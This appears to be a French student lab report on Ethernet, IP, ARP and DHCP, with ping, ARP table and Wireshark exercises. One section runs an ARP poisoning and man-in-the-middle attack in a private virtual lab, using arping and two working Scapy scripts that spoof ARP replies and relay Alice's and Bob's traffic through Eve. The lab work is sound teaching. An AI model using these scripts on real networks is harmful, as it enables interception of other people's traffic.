# TP2 : Ethernet, IP, et ARP
# I. Setup IP
🌞 **Mettez en place une configuration réseau fonctionnelle entre les deux machines**
```
$ sudo ip addr add 10.10.10.2/22 dev enp3s0
```
```
$ ip a

2: enp3s0:
    link/ether c0:18:50:0e:cb:bb
    inet 10.10.10.2/22
```
```
$ sipcalc 10.10.10.2/22

-[ipv4 : 10.10.10.2/22] - 0

[CIDR]
Network address		- 10.10.8.0
Network mask		- 255.255.252.0
Broadcast address	- 10.10.11.255
```
🌞 **Prouvez que la connexion est fonctionnelle entre les deux machines**
```
$ ping 10.10.10.3

PING 10.10.10.3 (10.10.10.3) 56(84) bytes of data.
64 bytes from 10.10.10.3: icmp_seq=1 ttl=128 time=2.47 ms
64 bytes from 10.10.10.3: icmp_seq=2 ttl=128 time=1.27 ms
64 bytes from 10.10.10.3: icmp_seq=3 ttl=128 time=1.33 ms
64 bytes from 10.10.10.3: icmp_seq=4 ttl=128 time=1.11 ms
^C
--- 10.10.10.3 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3004ms
rtt min/avg/max/mdev = 1.105/1.542/2.471/0.542 ms

```
🌞 **Wireshark it**
 - Ping : type 8, code 0
 - Pong : type 0, code 0

[Paquets ICMP](./Trames/ping.pcapng)
# II. ARP my bro
🌞 **Check the ARP table**
```
$ ip n s

10.33.19.254 dev wlp4s0 lladdr 00:c0:e7:e0:04:4e REACHABLE 
10.10.10.3 dev enp3s0 lladdr e4:a8:df:c1:f9:9d STALE 
```
- MAC de la gateway : 00:c0:e7:e0:04:4e
- MAC du binôme : e4:a8:df:c1:f9:9d

🌞 **Manipuler la table ARP**
```
$ sudo ip n flush all  
```
```
$  ip n s

10.33.19.254 dev wlp4s0 lladdr 00:c0:e7:e0:04:4e REACHABLE 

```
```
$ ping 10.10.10.3
```
```
$ ip n s

10.33.19.254 dev wlp4s0 lladdr 00:c0:e7:e0:04:4e REACHABLE 
10.10.10.3 dev enp3s0 lladdr e4:a8:df:c1:f9:9d REACHABLE 

```
🌞 **Wireshark it**

[Trames ARP](./arp.pcapng)

# II.5 Interlude hackerzz
## 1 - ARP poisoning
- Eve :
```
$ ip a

3: eth1:
    link/ether 08:00:27:be:50:e2
    inet 192.168.56.104/24
```
- Alice :
```
$ ip a

2: enp0s8:
    link/ether 08:00:27:ff:10:b8
    inet 192.168.56.102/24
```
- Bob : 
```
$ ip a

2: enp0s8:
    link/ether 08:00:27:c6:94:50
    inet 192.168.56.103/24

$ ip n s

192.168.56.1 dev enp0s8 lladdr 0a:00:27:00:00:00 REACHABLE
```
- Depuis Eve : 
```
$ sudo sysctl net.ipv4.ip_nonlocal_bind=1

$ sudo arping -c 1000000 -U -S 192.168.56.102 -I eth1 192.168.56.103
```
- Depuis Bob : 
```
$ ip n s

192.168.56.102 dev enp0s8 lladdr 08:00:27:be:50:e2 STALE
192.168.56.1 dev enp0s8 lladdr 0a:00:27:00:00:00 DELAY
```
[Pings](./arp_poisoning_1_ping.pcapng)
## 2 - Man in the middle
- ARP poisoning (arp_poisoning.py) : 
``` python 
from scapy.all import *

while 1:
    send(ARP(pdst = "192.168.56.102", psrc = "192.168.56.103", hwsrc = "08:00:27:be:50:e2"))
    send(ARP(pdst = "192.168.56.103", psrc = "192.168.56.102", hwsrc = "08:00:27:be:50:e2"))

```
- Man in the middle (mitm.py) : 
``` python
from scapy.all import *

# modifie et envoie les packets
def changer_dst(packet):
    if packet[Ether].dst == "08:00:27:be:50:e2": # si le mac du destinataire est celui d'eve
        # modifie l'adresse mac du destinataire en fonction de l'IP
        packet[Ether].dst = "08:00:27:ff:10:b8"*(packet[IP].dst == "192.168.56.102") + "08:00:27:c6:94:50"*(packet[IP].dst == "192.168.56.103")
        packet[Ether].src = "08:00:27:be:50:e2" # modifie l'adresse mac de l'expéditeur
        sendp(packet)

# Intercepte les packets
sniff(iface="eth0", filter = "icmp and host 192.168.56.103 and host 192.168.56.102", prn = changer_dst)

```
- Alice et Bob : 
```
[alice@localhost ~]$ ip n s

192.168.56.1 dev enp0s8 lladdr 0a:00:27:00:00:00 DELAY
```
```
[bob@localhost ~]$ ip n s

192.168.56.1 dev enp0s8 lladdr 0a:00:27:00:00:00 REACHABLE
```
- Eve : 
```
sudo python Desktop/arp_poisoning.py
```
- Alice et Bob : 
```
[alice@localhost ~]$ ip n s

192.168.56.1 dev enp0s8 lladdr 0a:00:27:00:00:00 DELAY
192.168.56.104 dev enp0s8 lladdr 08:00:27:be:50:e2 STALE
192.168.56.103 dev enp0s8 lladdr 08:00:27:be:50:e2 STALE

```
```
[bob@localhost ~]$ ip n s
192.168.56.100 dev enp0s8 lladdr 08:00:27:90:83:f3 STALE
192.168.56.1 dev enp0s8 lladdr 0a:00:27:00:00:00 DELAY
192.168.56.102 dev enp0s8 lladdr 08:00:27:be:50:e2 STALE
192.168.56.104 dev enp0s8 lladdr 08:00:27:be:50:e2 STALE
```
[Trames ARP poisoning](./arp_poisoning_py.pcapng)
- Eve : 
```
sudo python Desktop/mitm.py
```
- Alice et Bob : 
```
[alice@localhost ~]$ ping 192.168.56.103 -c 3

PING 192.168.56.103 (192.168.56.103) 56(84) bytes of data.
64 bytes from 192.168.56.103: icmp_seq=1 ttl=64 time=74.3 ms
64 bytes from 192.168.56.103: icmp_seq=2 ttl=64 time=68.1 ms
64 bytes from 192.168.56.103: icmp_seq=3 ttl=64 time=45.6 ms

--- 192.168.56.103 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2003ms
rtt min/avg/max/mdev = 45.616/62.655/74.280/12.312 ms
```
[Pings d'Alice](./alice_pings.pcapng)
```
[bob@localhost ~]$ ping 192.168.56.102 -c 3

PING 192.168.56.102 (192.168.56.102) 56(84) bytes of data.
64 bytes from 192.168.56.102: icmp_seq=1 ttl=64 time=50.9 ms
64 bytes from 192.168.56.102: icmp_seq=2 ttl=64 time=62.3 ms
64 bytes from 192.168.56.102: icmp_seq=3 ttl=64 time=59.0 ms

--- 192.168.56.102 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2003ms
rtt min/avg/max/mdev = 50.900/57.393/62.259/4.777 ms
```
[Pings de Bob](./bob_pings.pcapng)
# III. DHCP you too my brooo

🌞 **Wireshark it**

[Trames DHCP](./dhcp.pcapng)
- IP à utiliser : 
    Destinataire : 10.33.16.230
- Adresse IP de la passerelle réseau : 
    trame 2, option 3, routeur (10.33.19.254)
- Adresse d'un serveur DNS : 
    trame 2, option 6, Domaine Name Server (8.8.8.8 ; 8.8.4.4 ; 1.1.1.1)
